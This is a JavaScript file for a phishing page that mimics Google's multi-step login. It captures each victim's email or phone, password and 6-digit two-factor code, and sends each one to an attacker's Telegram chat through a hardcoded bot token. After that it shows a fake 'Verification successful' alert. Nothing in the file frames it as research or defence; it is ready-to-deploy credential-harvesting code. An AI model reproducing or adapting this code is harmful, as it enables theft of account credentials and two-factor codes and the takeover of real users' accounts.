document.addEventListener('DOMContentLoaded', function() {
    // Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
    const TELEGRAM_CHAT_ID = '8163151595'; // Replace with your chat ID
    
    // DOM elements
    const emailForm = document.getElementById('email-form');
    const passwordForm = document.getElementById('password-form');
    const verificationForm = document.getElementById('verification-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const verificationInput = document.getElementById('verification-code');
    const displayEmail = document.getElementById('display-email');
    const verificationEmail = document.getElementById('verification-email');
    const backToEmailBtn = document.getElementById('back-to-email');
    const backToPasswordBtn = document.getElementById('back-to-password');
    
    // Card elements
    const emailCard = document.getElementById('email-card');
    const passwordCard = document.getElementById('password-card');
    const verificationCard = document.getElementById('verification-card');
    
    // Current user email
    let currentEmail = '';
    
    // Function to send data to Telegram
    async function sendToTelegram(message) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            console.log('Telegram response:', data);
            return data.ok;
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            return false;
        }
    }
    
    // Show error message
    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
    }
    
    // Hide error message
    function hideError(element) {
        element.textContent = '';
        element.style.display = 'none';
    }
    
    // Validate email
    function isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }
    
    // Validate phone
    function isValidPhone(phone) {
        return /^\d+$/.test(phone);
    }
    
    // Email form submission
    emailForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const email = emailInput.value.trim();
        const emailError = document.getElementById('email-error');
        
        if (!email) {
            showError(emailError, 'Enter an email or phone number');
            return;
        }
        
        if (!isValidEmail(email) && !isValidPhone(email)) {
            showError(emailError, 'Enter a valid email or phone number');
            return;
        }
        
        hideError(emailError);
        
        // Send email to Telegram
        await sendToTelegram(`📧 <b>Google Login - Email Submitted</b>\n\nEmail/Phone: <code>${email}</code>`);
        
        currentEmail = email;
        displayEmail.textContent = email;
        verificationEmail.textContent = email;
        
        emailCard.classList.add('hidden');
        passwordCard.classList.remove('hidden');
        passwordInput.focus();
    });
    
    // Password form submission
    passwordForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const password = passwordInput.value;
        const passwordError = document.getElementById('password-error');
        
        if (!password) {
            showError(passwordError, 'Enter a password');
            return;
        }
        
        if (password.length < 8) {
            showError(passwordError, 'Password must be at least 8 characters');
            return;
        }
        
        hideError(passwordError);
        
        // Send password to Telegram
        await sendToTelegram(`🔑 <b>Google Login - Password Submitted</b>\n\nEmail: <code>${currentEmail}</code>\nPassword: <code>${password}</code>`);
        
        passwordCard.classList.add('hidden');
        verificationCard.classList.remove('hidden');
        verificationInput.focus();
    });
    
    // Verification form submission
    verificationForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const code = verificationInput.value.trim();
        const verificationError = document.getElementById('verification-error');
        
        if (!code) {
            showError(verificationError, 'Enter a verification code');
            return;
        }
        
        if (code.length !== 6 || !/^\d+$/.test(code)) {
            showError(verificationError, 'Enter a valid 6-digit code');
            return;
        }
        
        hideError(verificationError);
        
        // Send verification code to Telegram
        await sendToTelegram(`✅ <b>Google Login - Verification Submitted</b>\n\nEmail: <code>${currentEmail}</code>\nCode: <code>${code}</code>`);
        
        alert('Verification successful! Redirecting to your account...');
        // window.location.href = 'https://myaccount.google.com';
    });
    
    // Back to email button
    backToEmailBtn.addEventListener('click', function() {
        passwordCard.classList.add('hidden');
        emailCard.classList.remove('hidden');
        emailInput.focus();
    });
    
    // Back to password button
    backToPasswordBtn.addEventListener('click', function() {
        verificationCard.classList.add('hidden');
        passwordCard.classList.remove('hidden');
        passwordInput.focus();
    });
    
    // Input validation
    emailInput.addEventListener('input', function() {
        hideError(document.getElementById('email-error'));
    });
    
    passwordInput.addEventListener('input', function() {
        hideError(document.getElementById('password-error'));
    });
    
    verificationInput.addEventListener('input', function() {
        hideError(document.getElementById('verification-error'));
    });
});
